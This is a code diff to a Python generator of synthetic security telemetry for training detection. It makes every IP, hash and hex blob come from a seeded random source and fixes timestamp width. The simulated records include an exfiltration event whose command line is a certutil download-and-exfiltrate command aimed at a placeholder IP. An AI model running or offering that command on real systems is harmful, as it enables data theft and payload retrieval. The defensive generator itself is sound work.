@@ -36,7 +36,6 @@ the *shape* of an intrusion, and never claims to be one.
 from __future__ import annotations
 
 import random
-import uuid
 from collections import deque
 from collections.abc import Iterable
 from datetime import datetime, timezone
@@ -84,20 +83,15 @@ MALWARE = [
 ]
 
 
-def _internal_ip() -> str:
-    return f"{INTERNAL_SUBNET}{random.randint(2, 254)}"
-
-
-def _external_ip() -> str:
-    return f"{EXTERNAL_SUBNET}{random.randint(2, 254)}"
-
-
 def _now() -> datetime:
     return datetime.now(timezone.utc)
 
 
 def _iso() -> str:
-    return _now().isoformat()
+    # Fixed width on purpose. ``isoformat()`` omits the microsecond field when
+    # it happens to be zero, which made ``raw_log`` a character shorter and fed
+    # a wall-clock accident into the ``raw_log_length_scaled`` feature.
+    return _now().isoformat(timespec="microseconds")
 
 
 class SyntheticTelemetrySource(TelemetrySource):
@@ -149,6 +143,21 @@ class SyntheticTelemetrySource(TelemetrySource):
         #: Records queued by a campaign, drained ahead of new scenarios so a
         #: campaign arrives as a burst rather than being interleaved away.
         self._pending: deque[RawTelemetry] = deque()
+
+    # ------------------------------------------------------- seeded helpers
+    # Every source of randomness in a record must come through ``self._random``.
+    # These used to reach for the global ``random`` module and ``uuid.uuid4()``,
+    # which meant a seeded source still produced a different corpus on every
+    # run - and the training seed did not actually control the training data.
+
+    def _internal_ip(self) -> str:
+        return f"{INTERNAL_SUBNET}{self._random.randint(2, 254)}"
+
+    def _external_ip(self) -> str:
+        return f"{EXTERNAL_SUBNET}{self._random.randint(2, 254)}"
+
+    def _hex(self, length: int) -> str:
+        return "".join(self._random.choice("0123456789abcdef") for _ in range(length))
 
     # ------------------------------------------------------------------ API
     def collect(self, count: int = 1) -> Iterable[RawTelemetry]:
@@ -210,7 +219,7 @@ class SyntheticTelemetrySource(TelemetrySource):
                 ["winword.exe", "outlook.exe", "chrome.exe", "explorer.exe"]
             ),
             "FileName": f"invoice_{self._random.randint(1000, 9999)}.exe",
-            "SHA256": uuid.uuid4().hex + uuid.uuid4().hex[:32],
+            "SHA256": self._hex(96),
             "AccountName": self._random.choice(USERS),
             "RemediationAction": self._random.choice(["Quarantined", "Blocked"]),
             "Timestamp": _iso(),
@@ -247,7 +256,7 @@ class SyntheticTelemetrySource(TelemetrySource):
 
     def _sysmon_encoded_powershell(self) -> RawTelemetry:
         host = self._random.choice(INTERNAL_HOSTS)
-        blob = uuid.uuid4().hex + uuid.uuid4().hex + uuid.uuid4().hex
+        blob = self._hex(96)
         raw = {
             "EventID": 1,
             "Channel": "Microsoft-Windows-Sysmon/Operational",
@@ -299,7 +308,7 @@ class SyntheticTelemetrySource(TelemetrySource):
             "userPrincipalName": f"{user}@aegisx.local",
             "resultType": "0",
             "resultDescription": "Success",
-            "ipAddress": _external_ip(),
+            "ipAddress": self._external_ip(),
             "location": {"countryOrRegion": "IN", "city": "Chennai"},
             "riskLevelDuringSignIn": "none",
             "appDisplayName": self._random.choice(["Microsoft 365", "Azure Portal", "Teams"]),
@@ -319,7 +328,7 @@ class SyntheticTelemetrySource(TelemetrySource):
             "resultType": "50126",
             "resultDescription": "Invalid username or password",
             "failureCount": failures,
-            "ipAddress": _external_ip(),
+            "ipAddress": self._external_ip(),
             "location": {"countryOrRegion": self._random.choice(COUNTRIES), "city": "unknown"},
             "riskLevelDuringSignIn": "medium",
             "createdDateTime": _iso(),
@@ -342,7 +351,7 @@ class SyntheticTelemetrySource(TelemetrySource):
             "riskEventType": "impossibleTravel",
             "riskLevelDuringSignIn": "high",
             "impossibleTravel": True,
-            "ipAddress": _external_ip(),
+            "ipAddress": self._external_ip(),
             "location": {"countryOrRegion": self._random.choice(COUNTRIES[3:]), "city": "unknown"},
             "previousLocation": {"countryOrRegion": "IN", "city": "Chennai"},
             "createdDateTime": _iso(),
@@ -360,8 +369,8 @@ class SyntheticTelemetrySource(TelemetrySource):
         raw = {
             "action": "allow",
             "protocol": self._random.choice(["TCP", "UDP"]),
-            "src_ip": _internal_ip(),
-            "dst_ip": _external_ip(),
+            "src_ip": self._internal_ip(),
+            "dst_ip": self._external_ip(),
             "dst_port": self._random.choice([443, 443, 443, 80, 22, 8443]),
             "bytes_out": self._random.randint(1_000, 5_000_000),
             "rule": "allow-outbound-web",
@@ -380,8 +389,8 @@ class SyntheticTelemetrySource(TelemetrySource):
         raw = {
             "action": "deny",
             "protocol": "TCP",
-            "src_ip": _external_ip(),
-            "dst_ip": _internal_ip(),
+            "src_ip": self._external_ip(),
+            "dst_ip": self._internal_ip(),
             "dst_port": self._random.randint(1, 65535),
             "distinct_ports": ports,
             "deny_count": ports * self._random.randint(1, 4),
@@ -404,8 +413,8 @@ class SyntheticTelemetrySource(TelemetrySource):
         raw = {
             "query": domain,
             "query_type": "A",
-            "client_ip": _internal_ip(),
-            "resolved_ip": _external_ip(),
+            "client_ip": self._internal_ip(),
+            "resolved_ip": self._external_ip(),
             "response_code": "NOERROR",
             "timestamp": _iso(),
             "synthetic": True,
@@ -413,13 +422,13 @@ class SyntheticTelemetrySource(TelemetrySource):
         return self._wrap("DNS Resolver", SourceType.DNS, raw, f"[DNS] A {domain} -> NOERROR")
 
     def _dns_beaconing(self) -> RawTelemetry:
-        label = uuid.uuid4().hex[: self._random.randint(16, 28)]
+        label = self._hex(self._random.randint(16, 28))
         domain = f"{label}.{self._random.choice(['cdn-metrics', 'sync-node', 'edge-cache'])}.example"
         raw = {
             "query": domain,
             "query_type": "TXT",
-            "client_ip": _internal_ip(),
-            "resolved_ip": _external_ip(),
+            "client_ip": self._internal_ip(),
+            "resolved_ip": self._external_ip(),
             "response_code": "NOERROR",
             "query_count": self._random.randint(50, 900),
             "periodic": True,
@@ -442,7 +451,7 @@ class SyntheticTelemetrySource(TelemetrySource):
             "facility": "sshd",
             "host": host,
             "user": user,
-            "src_ip": _internal_ip(),
+            "src_ip": self._internal_ip(),
             "result": "accepted",
             "auth_method": "publickey",
             "timestamp": _iso(),
@@ -465,7 +474,7 @@ class SyntheticTelemetrySource(TelemetrySource):
             "facility": "sudo",
             "host": host,
             "user": user,
-            "src_ip": _internal_ip(),
+            "src_ip": self._internal_ip(),
             "command": command,
             "privilege_change": True,
             "result": "success",
@@ -514,7 +523,7 @@ class SyntheticTelemetrySource(TelemetrySource):
             "process": "C:\\Windows\\System32\\certutil.exe",
             "command_line": "certutil.exe -urlcache -split -f http://203.0.113.44/collect",
             "bytes_out": volume,
-            "dst_ip": _external_ip(),
+            "dst_ip": self._external_ip(),
             "tactic": "Exfiltration",
             "technique": "T1041",
             "severity": "High",
@@ -561,8 +570,8 @@ class SyntheticTelemetrySource(TelemetrySource):
         raw = {
             "action": "allow",
             "protocol": "TCP",
-            "src_ip": _internal_ip(),
-            "dst_ip": _external_ip(),
+            "src_ip": self._internal_ip(),
+            "dst_ip": self._external_ip(),
             "dst_port": port,
             "bytes_out": self._random.randint(50_000, 40_000_000),
             "rule": "allow-outbound-any",
@@ -590,8 +599,8 @@ class SyntheticTelemetrySource(TelemetrySource):
         raw = {
             "query": domain,
             "query_type": "A",
-            "client_ip": _internal_ip(),
-            "resolved_ip": _external_ip(),
+            "client_ip": self._internal_ip(),
+            "resolved_ip": self._external_ip(),
             "response_code": "NOERROR",
             "timestamp": _iso(),
             "synthetic": True,
@@ -611,7 +620,7 @@ class SyntheticTelemetrySource(TelemetrySource):
             "userPrincipalName": f"{user}@aegisx.local",
             "resultType": "0",
             "status": "Success",
-            "ipAddress": _external_ip(),
+            "ipAddress": self._external_ip(),
             "location": {"countryOrRegion": self._random.choice(COUNTRIES)},
             "appDisplayName": self._random.choice(["Azure Portal", "Office 365", "VPN"]),
             "createdDateTime": _iso(),
@@ -633,7 +642,7 @@ class SyntheticTelemetrySource(TelemetrySource):
         the same address - is what the correlation engine is for.
         """
         user = self._random.choice(USERS)
-        source = _external_ip()
+        source = self._external_ip()
         attempts = self._random.randint(3, 6)
         records: list[RawTelemetry] = []
 
@@ -689,7 +698,7 @@ class SyntheticTelemetrySource(TelemetrySource):
         which is why it is a correlation pattern rather than a rule.
         """
         user = self._random.choice(USERS)
-        source = _internal_ip()
+        source = self._internal_ip()
         hosts = self._random.sample(
             [host for host in INTERNAL_HOSTS if host.startswith("SYN-LNX")],
             k=min(4, len([h for h in INTERNAL_HOSTS if h.startswith("SYN-LNX")])),
@@ -722,7 +731,7 @@ class SyntheticTelemetrySource(TelemetrySource):
         """
         host = self._random.choice([h for h in INTERNAL_HOSTS if h.startswith("SYN-WIN")])
         user = self._random.choice(USERS)
-        source = _external_ip()
+        source = self._external_ip()
 
         return [
             self._wrap(
@@ -776,7 +785,7 @@ class SyntheticTelemetrySource(TelemetrySource):
                 {
                     "action": "allow",
                     "protocol": "TCP",
-                    "src_ip": _internal_ip(),
+                    "src_ip": self._internal_ip(),
                     "dst_ip": source,
                     "dst_port": self._random.choice(UNUSUAL_PORTS),
                     "bytes_out": self._random.randint(10_000_000, 90_000_000),
